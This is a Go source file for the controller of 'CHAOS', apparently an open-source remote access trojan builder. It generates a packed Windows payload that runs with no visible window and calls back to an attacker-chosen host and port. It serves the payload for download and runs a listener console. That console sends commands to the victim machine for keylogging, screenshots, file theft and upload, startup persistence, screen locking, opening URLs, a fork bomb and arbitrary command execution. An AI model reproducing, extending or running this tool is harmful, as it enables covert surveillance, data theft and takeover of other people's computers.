package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"
	"bytes"
)

const (
	WHITE   = "\x1b[37;1m"
	RED     = "\x1b[31;1m"
	GREEN   = "\x1b[32;1m"
	YELLOW  = "\x1b[33;1m"
	BLUE    = "\x1b[34;1m"
	MAGENTA = "\x1b[35;1m"
	CYAN    = "\x1b[36;1m"
	VERSION = "2.1.0"
)

func main() {
	DetectOS()
	ClearScreen()
	ShowMenu()
}

func DetectOS() {
	if runtime.GOOS == "linux" {
		fmt.Println("[i] Linux!")
	} else if runtime.GOOS == "windows" {
		fmt.Println("[!] Windows are not supported!")
		os.Exit(0)
	} else {
		fmt.Println("[!] OS not supported!")
		os.Exit(0)
	}
}

func ClearScreen() {
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func ReadLine() string {
	buf := bufio.NewReader(os.Stdin)
	lin, _, err := buf.ReadLine()
	if err != nil {
		fmt.Println(RED, "[!] Error to Read Line!")
	}
	return string(lin)
}

func WaitTime(sec time.Duration) {
	go func() {
		time.Sleep(time.Second * sec)
	}()
	select {
	case <-time.After(time.Second * sec):
	}
}

func GeneratePath(str_size int) string {
	characters := "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	var bytes = make([]byte, str_size)
	rand.Read(bytes)
	for i, x := range bytes {
		bytes[i] = characters[x%byte(len(characters))]
	}
	return string(bytes)
}

func GenerateKey(Size int) string {
	characters := "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%&*()_-"
	var bytes = make([]byte, Size)
	rand.Read(bytes)
	for i, x := range bytes {
		bytes[i] = characters[x%byte(len(characters))]
	}
	return string(bytes)
}

func GenerateNameFileTmp(Size int) string {
	characters := "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	var bytes = make([]byte, Size)
	rand.Read(bytes)
	for i, x := range bytes {
		bytes[i] = characters[x%byte(len(characters))]
	}
	return string(bytes)
}

func Encrypt(Key []byte, PlainCode []byte) string {
	Block, err := aes.NewCipher(Key)
	if err != nil {
		panic(err)
	}

	CipherCode := make([]byte, aes.BlockSize+len(PlainCode))
	Blk := CipherCode[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, Blk); err != nil {
		panic(err)
	}

	Stream := cipher.NewCFBEncrypter(Block, Blk)
	Stream.XORKeyStream(CipherCode[aes.BlockSize:], PlainCode)

	return base64.URLEncoding.EncodeToString(CipherCode)
}

func getDateTime() string{
  currentTime := time.Now()
  // https://golang.org/pkg/time/#example_Time_Format
  return currentTime.Format("2006-01-02-15-04-05")
}

func TemplateTextReplace(ParamOne string, ParamTwo string, ParamThree string, ParamFour string, ParamFive string){
  input, err := ioutil.ReadFile("Template_CHAOS.go")

  if err != nil {
    fmt.Println(RED, "[!] Error to replace template!")
		os.Exit(1)
  }

  output := bytes.Replace(input, []byte("IPAddress"), []byte(string(ParamOne)), -1)
  output = bytes.Replace(output, []byte("ServerPort"), []byte(string(ParamTwo)), -1)
  output = bytes.Replace(output, []byte("FileNameCHAOS"), []byte(string(ParamThree)), -1)
  output = bytes.Replace(output, []byte("NameFolderExtesion"), []byte(string(ParamFour)), -1)

  if err = ioutil.WriteFile(ParamFive + ".go", output, 0666); err != nil {
		fmt.Println(RED, "[!] Error to write template!")
		os.Exit(1)
  }
}

func ServeFiles(){
	go exec.Command("sh", "-c", "xterm -e \"go run Serve.go\"").Output()
}

func ShowName() {
	fmt.Println("")
	fmt.Println(RED, "▄████████    ▄█    █▄       ▄████████  ▄██████▄     ▄████████  ")
	fmt.Println(RED, "███    ███   ███    ███     ███    ███ ███    ███   ███    ███ ")
	fmt.Println(RED, "███    █▀    ███    ███     ███    ███ ███    ███   ███    █▀  ")
	fmt.Println(RED, "███         ▄███▄▄▄▄███▄▄   ███    ███ ███    ███   ███        ")
	fmt.Println(RED, "███        ▀▀███▀▀▀▀███▀  ▀███████████ ███    ███ ▀███████████ ")
	fmt.Println(RED, "███    █▄    ███    ███     ███    ███ ███    ███          ███ ")
	fmt.Println(RED, "███    ███   ███    ███     ███    ███ ███    ███    ▄█    ███ ")
	fmt.Println(RED, "████████▀    ███    █▀      ███    █▀   ▀██████▀   ▄████████▀  ")
}

func ShowMenu() {
	ClearScreen()
	ShowName()
	fmt.Println("")
	fmt.Println(GREEN, "                                                Version: "+VERSION)
	fmt.Println(CYAN, "                                         Author: tiagorlampert")
	fmt.Println("")
	fmt.Println(YELLOW, " [1] Generate")
	fmt.Println(YELLOW, " [2] Listen")
	fmt.Println(YELLOW, " [3] Serve")
	fmt.Println(YELLOW, " [4] Quit")
	fmt.Println("")
	fmt.Print(WHITE, " Choose a Option: ")
	OPT := ReadLine()

	switch OPT {
	case "1":
		GenerateCode()
	case "2":
		RunServer()
	case "3":
		ServeFiles()
		ClearScreen()
		ShowMenu()
	case "4":
		ClearScreen()
		os.Exit(0)
	}
	fmt.Println("")
	fmt.Print(RED, " [!] Invalid Option!")
	WaitTime(2)
	ShowMenu()
}

func GenerateCode() {
	ClearScreen()
	ShowName()
	fmt.Println("")
	fmt.Println(YELLOW, "GENERATE PAYLOAD")
	fmt.Println(YELLOW, "--------------------------")
	fmt.Println("")
	fmt.Print(YELLOW, " [*] Enter LHOST: ", WHITE)
	LHOST := ReadLine()
	if len(LHOST) < 7 {
		fmt.Println(RED, "[!] Invalid LHOST!")
		WaitTime(2)
		GenerateCode()
	} else if len(LHOST) > 15 {
		fmt.Println(RED, "[!] Invalid LHOST!")
		WaitTime(2)
		GenerateCode()
	}

	fmt.Print(YELLOW, " [*] Enter LPORT: ", WHITE)
	LPORT := ReadLine()
	if len(LPORT) == 0 {
		LPORT = "8080"
		fmt.Println(GREEN, "[+] DEFAULT LPORT ("+LPORT+")")
	} else if len(LPORT) < 2 {
		fmt.Println(RED, "[!] Invalid LPORT!")
		WaitTime(2)
		GenerateCode()
	}

	fmt.Print(YELLOW, " [*] Enter name for file (.exe): ", WHITE)
	NAME := ReadLine()
	for len(NAME) == 0 {
		fmt.Println(RED, "[!] Invalid Name!")
		fmt.Print(YELLOW, " [*] Enter name for file (.exe): ", WHITE)
		NAME = ReadLine()
	}

	pathPersistence := GeneratePath(8)
	NAME = NAME + getDateTime()

	TemplateTextReplace(string(LHOST), string(LPORT), string(NAME + ".exe"), string(pathPersistence), string(NAME))

	fmt.Println("")
	fmt.Println(GREEN, "[*] Compiling...")
	exec.Command("sh", "-c", "GOOS=windows GOARCH=386 go build -ldflags \"-s -w -H=windowsgui\" "+string(NAME) + ".go").Output()

	fmt.Println(GREEN, "[*] Generated \"" + string(NAME) + ".exe\"")
	fmt.Println("")

	fmt.Print(YELLOW, "Compress the payload with UPX? (y/N): ", WHITE)
	UPX := ReadLine()
	if len(UPX) == 0 {
		UPX = "n"
	}
	if UPX == "y" || UPX == "Y" {
		UPXOUT, _ := exec.Command("sh", "-c", "upx --force " + string(NAME) + ".exe").Output()
		fmt.Println("")
		fmt.Println(string(UPXOUT))
		WaitTime(5)
	} else if UPX == "n" || UPX == "N" {
		fmt.Println(WHITE, "[!] Not Compress!")
	} else {
		fmt.Println(RED, "[!] Invalid Option!")
		WaitTime(2)
	}

	fmt.Println("")
	fmt.Print(YELLOW, "Start Serve Files Now? (Y/n): ", WHITE)
	SERVE := ReadLine()
	if SERVE == "y" || SERVE == "Y" {
		ServeFiles()
	} else if SERVE == "n" || SERVE == "N" {
		fmt.Println(WHITE, "[!] Not Serve!")
	} else {
		fmt.Println(GREEN, "[+] DEFAULT OPTION: STARTING SERVER NOW")
		ServeFiles()
	}

	fmt.Println("")
	fmt.Print(YELLOW, "Start Listener Now? (Y/n): ", WHITE)
	LISTENER := ReadLine()
	if LISTENER == "y" || LISTENER == "Y" {
		RunServer()
	} else if LISTENER == "n" || LISTENER == "N" {
		ShowMenu()
	} else {
		RunServer()
	}
}

func RunServer() {
	ClearScreen()
	ShowName()
	fmt.Println("")
	fmt.Println(YELLOW, "START LISTENER")
	fmt.Println(YELLOW, "--------------------------")
	fmt.Println("")
	fmt.Print(YELLOW, " [*] Enter LPORT: ", WHITE)
	LPORT := ReadLine()
	if len(LPORT) == 0 {
		LPORT = "8080"
		fmt.Println(GREEN, "[+] DEFAULT LPORT DEFINED ("+LPORT+")")
	} else if len(LPORT) < 2 {
		fmt.Println(RED, "[!] Invalid LPORT!")
		WaitTime(2)
		GenerateCode()
	}
	fmt.Println("")
	fmt.Println(CYAN, "[*] Waiting for connection...")
	ln, _ := net.Listen("tcp", ":"+LPORT)
	conn, _ := ln.Accept()
	fmt.Println(GREEN, "[+] Connected!")
	fmt.Println("")

	for {
		fmt.Print(RED, "CHAOS ", WHITE, "> ")
		command := ReadLine()

		switch command {
		case "help":
			fmt.Println("")
			fmt.Println(CYAN, "COMMANDS              DESCRIPTION")
			fmt.Println(CYAN, "-------------------------------------------------------")
			fmt.Println(CYAN, "download            - File Download")
			fmt.Println(CYAN, "upload              - File Upload")
			fmt.Println(CYAN, "screenshot          - Take a ScreenShot")
			fmt.Println(CYAN, "keylogger start     - Start Keylogger session")
			fmt.Println(CYAN, "keylogger show      - Show Keylogger session logs")
			fmt.Println(CYAN, "persistence enable  - Install at Startup")
			fmt.Println(CYAN, "persistence disable - Remove from Startup")
			fmt.Println(CYAN, "getos               - Get Operating System Name")
			fmt.Println(CYAN, "lockscreen          - Lock the Screen")
			fmt.Println(CYAN, "openurl             - Open the URL Informed")
			fmt.Println(CYAN, "bomb                - Run Fork Bomb")
			fmt.Println(CYAN, "clear or cls        - Clear the Screen")
			fmt.Println(CYAN, "back                - Close Connection but Keep Running")
			fmt.Println(CYAN, "exit                - Close Connection and exit")
			fmt.Println(CYAN, "help                - Show this Help")
			fmt.Println(CYAN, "-------------------------------------------------------")
			fmt.Println("")

		case "clear":
			ClearScreen()

		case "cls":
			ClearScreen()

		case "back":
			encBack := base64.URLEncoding.EncodeToString([]byte("back"))
			conn.Write([]byte(encBack + "\n"))
			conn.Close()
			os.Exit(0)

		case "exit":
			encExit := base64.URLEncoding.EncodeToString([]byte("exit"))
			conn.Write([]byte(encExit + "\n"))
			os.Exit(0)

		case "screenshot":
			encScreenShot := base64.URLEncoding.EncodeToString([]byte("screenshot"))
			conn.Write([]byte(encScreenShot + "\n"))

			outputName := getDateTime()

			encData, _ := bufio.NewReader(conn).ReadString('\n')

			fmt.Println(YELLOW, "-> Getting ScreenShot...")
			decData, _ := base64.URLEncoding.DecodeString(encData)

			ioutil.WriteFile(string(outputName) + ".png", []byte(decData), 777)

			out, err := exec.Command("sh", "-c", "eog " + string(outputName) + ".png").Output()
			if err != nil {
		     	 fmt.Printf("%s", err)
		   	}
			fmt.Printf("%s", out)

		case "keylogger start":
			klgListen := base64.URLEncoding.EncodeToString([]byte("keylogger start"))
			conn.Write([]byte(klgListen + "\n"))
			message, _ := bufio.NewReader(conn).ReadString('\n')
			decoded, _ := base64.StdEncoding.DecodeString(message)
			fmt.Print(YELLOW, string(decoded) + "\n")

		case "keylogger show":
			klgShow := base64.URLEncoding.EncodeToString([]byte("keylogger show"))
			conn.Write([]byte(klgShow + "\n"))
			message, _ := bufio.NewReader(conn).ReadString('\n')
			decoded, _ := base64.StdEncoding.DecodeString(message)
			fmt.Print(string(decoded) + "\n")

		case "download":
			encDownload := base64.URLEncoding.EncodeToString([]byte("download"))
			conn.Write([]byte(encDownload + "\n"))

			fmt.Print("File Path to Download: ")
			nameDownload := ReadLine()
			encName := base64.URLEncoding.EncodeToString([]byte(nameDownload))
			conn.Write([]byte(encName + "\n"))

			fmt.Print("Output name: ")
			outputName := ReadLine()

			encData, _ := bufio.NewReader(conn).ReadString('\n')

			fmt.Println(YELLOW, "-> Downloading...")
			decData, _ := base64.URLEncoding.DecodeString(encData)
			ioutil.WriteFile(string(outputName) + getDateTime(), []byte(decData), 777)

		case "upload":
			encUpload := base64.URLEncoding.EncodeToString([]byte("upload"))
			conn.Write([]byte(encUpload + "\n"))

			fmt.Print("File Path to Upload: ")
			pathUpload := ReadLine()

			fmt.Print("Output name: ")
			outputName := ReadLine()
			encOutput := base64.URLEncoding.EncodeToString([]byte(outputName))
			conn.Write([]byte(encOutput + getDateTime() + "\n"))

			fmt.Println(YELLOW, "-> Uploading...")

			file, err := ioutil.ReadFile(pathUpload)
			if err != nil {
				fmt.Println(RED, "[!] File not found!")
			}
			encData := base64.URLEncoding.EncodeToString(file)
			conn.Write([]byte(string(encData) + "\n"))

		case "getos":
			getAv := base64.URLEncoding.EncodeToString([]byte("getos"))
			conn.Write([]byte(getAv + "\n"))
			message, _ := bufio.NewReader(conn).ReadString('\n')
			decoded, _ := base64.StdEncoding.DecodeString(message)
			fmt.Print(string(decoded))

		case "lockscreen":
			lookScreen := base64.URLEncoding.EncodeToString([]byte("lockscreen"))
			conn.Write([]byte(lookScreen + "\n"))
			message, _ := bufio.NewReader(conn).ReadString('\n')
			decoded, _ := base64.StdEncoding.DecodeString(message)
			fmt.Println(YELLOW, string(decoded))

		case "ls":
			lookScreen := base64.URLEncoding.EncodeToString([]byte("ls"))
			conn.Write([]byte(lookScreen + "\n"))
			message, _ := bufio.NewReader(conn).ReadString('\n')
			decoded, _ := base64.StdEncoding.DecodeString(message)
			fmt.Println(string(decoded))

		case "persistence enable":
			persistence := base64.URLEncoding.EncodeToString([]byte("persistence enable"))
			conn.Write([]byte(persistence + "\n"))
			message, _ := bufio.NewReader(conn).ReadString('\n')
			decoded, _ := base64.StdEncoding.DecodeString(message)
			fmt.Println(GREEN, string(decoded))

		case "persistence disable":
			persistence := base64.URLEncoding.EncodeToString([]byte("persistence disable"))
			conn.Write([]byte(persistence + "\n"))
			message, _ := bufio.NewReader(conn).ReadString('\n')
			decoded, _ := base64.StdEncoding.DecodeString(message)
			fmt.Println(YELLOW, string(decoded))

		case "bomb":
			persistence := base64.URLEncoding.EncodeToString([]byte("bomb"))
			conn.Write([]byte(persistence + "\n"))
			message, _ := bufio.NewReader(conn).ReadString('\n')
			decoded, _ := base64.StdEncoding.DecodeString(message)
			fmt.Println(YELLOW, string(decoded))

		case "openurl":
			encDownload := base64.URLEncoding.EncodeToString([]byte("openurl"))
			conn.Write([]byte(encDownload + "\n"))
			fmt.Print("Type URL to Open: ")
			url := ReadLine()
			encUrl := base64.URLEncoding.EncodeToString([]byte(url))
			conn.Write([]byte(encUrl + "\n"))
			message, _ := bufio.NewReader(conn).ReadString('\n')
			decoded, _ := base64.StdEncoding.DecodeString(message)
			fmt.Println(YELLOW, string(decoded))
		}

		if command != "help" {
			conn.Write([]byte(command + "\n"))

			message, _ := bufio.NewReader(conn).ReadString('\n')
			decoded, _ := base64.StdEncoding.DecodeString(message)
			fmt.Print(string(decoded))
		}
	}
}
